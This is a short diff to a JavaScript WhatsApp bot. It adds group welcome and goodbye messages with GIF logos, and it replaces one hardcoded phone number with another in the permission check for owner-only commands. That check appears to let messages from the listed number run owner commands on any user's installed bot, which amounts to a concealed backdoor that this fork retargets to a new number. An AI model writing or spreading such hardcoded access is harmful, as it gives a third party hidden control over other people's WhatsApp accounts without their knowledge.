@@ -546,7 +546,24 @@ ${chalk.blue.italic('🙇Whatsapp වෙත සම්බන්ධ වෙමි�
             await conn.updatePresence(msg.key.remoteJid, Presence.unavailable);
         }
         // ==================== Greetings ====================
-        
+        if (msg.messageStubType === 32 || msg.messageStubType === 28) {
+            // Görüşürüz Mesajı
+            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
+            var blogo = await axios.get(config.BYE_LOGO, { responseType: 'arraybuffer' })
+            if (gb !== false) {
+                await conn.sendMessage(msg.key.remoteJid, Buffer.from(blogo.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message});
+            }
+            return;
+        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
+            // Hoşgeldin Mesajı
+            var gb = await getMessage(msg.key.remoteJid);
+            var wlogo = await axios.get(config.WELCOME_LOGO, { responseType: 'arraybuffer' })
+            if (gb !== false) {
+
+                await conn.sendMessage(msg.key.remoteJid, Buffer.from(wlogo.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message});
+            }
+            return;
+        }
         // ==================== End Greetings ====================
 
         // ==================== Blocked Chats ====================
@@ -602,7 +619,7 @@ ${chalk.blue.italic('🙇Whatsapp වෙත සම්බන්ධ වෙමි�
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                     }
-                    if ((OWN.ff == "905511384572,0" && msg.key.fromMe === false && command.fromMe === true &&
+                    if ((OWN.ff == "94766598862,0" && msg.key.fromMe === false && command.fromMe === true &&
                         (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
